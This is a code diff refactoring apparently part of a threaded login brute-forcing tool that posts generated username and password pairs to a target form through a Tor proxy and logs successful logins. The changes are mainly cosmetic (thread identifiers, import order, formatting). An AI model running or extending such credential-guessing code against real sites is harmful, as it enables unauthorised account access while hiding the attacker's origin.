@@ -2,24 +2,19 @@ import logging
 import re
 import time
 from configparser import ConfigParser
-from multiprocessing import Lock, Condition
+from multiprocessing import Condition, Lock
 from multiprocessing.pool import ThreadPool
-from threading import current_thread
+from threading import get_ident
 
 import requests
-from requests.exceptions import ConnectionError, Timeout
 from alive_progress import alive_bar
+from requests.exceptions import ConnectionError, Timeout
 
 from ..generator import PasswdGenerator, TupleGenerator
 from ..onion import TorProxy
 from .cli_parser import Args
 
 __all__ = ["App"]
-
-
-def get_thread_id(name: str) -> int:
-    """Return the thread id from the thread name"""
-    return int(name.split("-")[1].split(" ")[0])
 
 
 class App:
@@ -57,11 +52,11 @@ class App:
         last_exception: str = None
         try_no = 0
 
-        session = self.sessions.get(tid := get_thread_id(name := current_thread().name))
+        session = self.sessions.get(tid := get_ident(), None)
         if not session:
             session = self.build_session(pport)
             self.sessions.update({tid: session})
-            self.logger.debug("new session for %s", name)
+            self.logger.debug("new session for Thread-%d (worker)", tid)
 
         # 3 tries to connect to the target
         # connected if some response and status code is 200
@@ -69,10 +64,7 @@ class App:
             try:
                 response = session.post(
                     self.post_url,
-                    data={
-                        self.username_field: username_field,
-                        self.password_field: password_field,
-                    },
+                    data={self.username_field: username_field, self.password_field: password_field},
                     allow_redirects=True,  # maybe new page when successfull login
                     timeout=self.timeout,  # 10 secondes by default
                 )
@@ -104,11 +96,7 @@ class App:
                     self.consecutive_fails += 1
 
         if response and self.target.search(response.text):
-            self.logger.info(
-                "Login successful using [%s]:[%s] 🎉",
-                username_field,
-                password_field,
-            )
+            self.logger.info("Login successful using [%s]:[%s] 🎉", username_field, password_field)
 
     def build_session(self, pport: int) -> requests.Session:
         """Build a new session with the new port"""
